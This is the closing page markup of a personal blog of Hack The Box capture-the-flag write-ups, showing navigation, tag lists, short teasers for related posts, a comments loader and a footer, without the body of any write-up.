class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hack-The-Box-Authority/">Hack The Box - Authority</a><li><a href="/posts/HAck-the-Box-Photobomb/">Hack The Box - Photobomb</a><li><a href="/posts/Hack-The-Box-Querier/">Hack The Box - Querier</a><li><a href="/posts/Ejptv2/">eLearnSecurity - eJPTv2</a><li><a href="/posts/Hack-The-Box-Hiest/">Hack The Box - Heist</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HAck-the-Box-Photobomb/"><div class="card-body"> <em class="small" data-ts="1676178000" data-df="ll" > Feb 12, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Photobomb</h3><div class="text-muted small"><p> Photobomb was a easy rated linux box, where plaintext credentials was discovered after viewing the source code. These credentials then lead to a webpage with download  functionality that was vuln...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Active/"><div class="card-body"> <em class="small" data-ts="1674018000" data-df="ll" > Jan 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Active</h3><div class="text-muted small"><p> RECON NMAP Starting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1. $sudo nmap -sT -p- -oA alltcp 10.10...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Return/"><div class="card-body"> <em class="small" data-ts="1674882000" data-df="ll" > Jan 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Return</h3><div class="text-muted small"><p> Return was an easy box that involved exploiting a printer’s web administration panel to obtain LDAP credentials. These credentials can then be used to access WinRM. The account obtained through t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HAck-the-Box-Photobomb/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Photobomb</p></a> <a href="/posts/Hack-The-Box-Authority/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Authority</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://niraj-maharjan.com.np/posts/Hack-The-Box-Shoppy/'; this.page.identifier = '/posts/Hack-The-Box-Shoppy/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver( function (entries) { if (entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://nirazzz.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] } ); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* Disqus hasn't been loaded */ if (typeof DISQUS === 'undefined') { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } } if (document.querySelector('.mode-toggle')) { window.addEventListener('message', reloadDisqus); } </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/username">Niraj Maharjan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
